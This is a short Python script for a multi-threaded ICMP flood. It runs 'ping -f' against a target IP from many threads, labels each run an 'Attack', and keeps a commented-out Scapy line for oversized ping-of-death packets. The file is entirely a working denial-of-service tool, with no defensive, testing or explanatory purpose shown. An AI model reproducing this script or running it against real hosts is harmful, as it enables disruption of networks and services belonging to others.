
import subprocess
import threading
import argparse


# send(IP(dst=target2)/ICMP()/("X"*60000))
def getArg():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--ip", dest="ip")
    parse.add_argument("-t", "--thread_num", dest="thread_num")
    options = parse.parse_args()
    return options


opt = getArg()


def ping_od(ip):
    subprocess.call(["ping","-f", ip])
    print("Attack => "+ ip)

class Thread(threading.Thread):
    def run(self):
        ping_od(opt.ip)


for i in range(int(opt.thread_num)):
    t = Thread()
    t.start()
